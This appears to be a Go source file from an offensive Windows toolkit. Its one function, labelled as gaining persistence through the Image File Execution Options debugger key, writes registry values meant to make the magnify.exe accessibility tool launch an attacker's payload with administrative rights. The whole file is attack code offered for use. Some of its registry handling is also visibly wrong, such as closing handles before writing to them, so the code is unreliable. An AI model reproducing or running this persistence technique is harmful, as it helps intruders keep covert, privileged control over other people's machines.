package guacbypasser

import (
	"log"
	"path/filepath"
	"runtime"

	"golang.org/x/sys/windows/registry"
)

func pIfeo(path string) error {
	_ = Reporter{
		Name: "ifeo",
		Desc: "Gain persistence using IFEO debugger registry key",
		Id:   6,

		Type:   "Persistence",
		Module: "pIfeo",

		Fixed:   false,
		FixedIn: "",

		Admin:   true,
		Payload: true,
	}

	fullPath, err := filepath.Abs(path)
	if err != nil {
		return err
	}

	if _, _, err = registry.CreateKey(
		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
		registry.SET_VALUE|registry.ALL_ACCESS); err != nil {

		return err
	}
	if runtime.GOARCH == "386" {
		if _, _, err = registry.CreateKey(
			registry.CURRENT_USER, `Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
			registry.SET_VALUE|registry.ALL_ACCESS); err != nil {

			return err
		}

		wk32, err := registry.OpenKey(
			registry.CURRENT_USER, `Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
			registry.QUERY_VALUE|registry.SET_VALUE,
		)
		defer wk32.Close()
		if err != nil {
			return err
		}
		if err := wk32.SetStringValue("Configuration", "magnifierpane"); err != nil {
			return err
		}

		wk32, err = registry.OpenKey(
			registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
			registry.QUERY_VALUE|registry.SET_VALUE,
		)
		wk32.Close()
		if err != nil {
			return err
		}
		if err := wk32.SetStringValue("Debugger", fullPath); err != nil {
			return err
		}
	} else {
		if _, _, err = registry.CreateKey(
			registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
			registry.SET_VALUE|registry.ALL_ACCESS); err != nil {

			return err
		}
		wk32, err := registry.OpenKey(
			registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
			registry.QUERY_VALUE|registry.SET_VALUE,
		)
		defer wk32.Close()
		if err != nil {
			return err
		}
		if err := wk32.SetStringValue("Configuration", "magnifierpane"); err != nil {
			return err
		}

		wk32, err = registry.OpenKey(
			registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
			registry.QUERY_VALUE|registry.SET_VALUE,
		)
		wk32.Close()
		if err != nil {
			log.Println(err)
		}
		if err := wk32.SetStringValue("Debugger", fullPath); err != nil {
			log.Println(err)
		}
	}

	return nil
}
